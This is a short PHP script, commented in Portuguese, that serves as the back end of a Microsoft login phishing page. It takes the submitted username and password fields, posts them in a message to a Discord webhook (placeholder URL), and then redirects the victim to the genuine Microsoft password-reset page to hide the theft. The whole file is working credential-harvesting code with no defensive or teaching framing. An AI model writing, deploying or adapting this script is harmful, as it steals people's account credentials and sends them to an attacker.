<?php
// Captura dados do POST
$user = $_POST['loginfmt'];
$pass = $_POST['passwd'];

// URL do webhook do Discord
$webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";

// Monta a mensagem
$data = [
    "content" => "📩 Microsoft Username: $user\n🔑 Pass: $pass"
];

// Configura requisição HTTP
$options = [
    'http' => [
        'header'  => "Content-type: application/json",
        'method'  => 'POST',
        'content' => json_encode($data)
    ]
];

// Envia para o Discord
$context  = stream_context_create($options);
file_get_contents($webhook, false, $context);

// Redireciona para a página legítima
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
?>
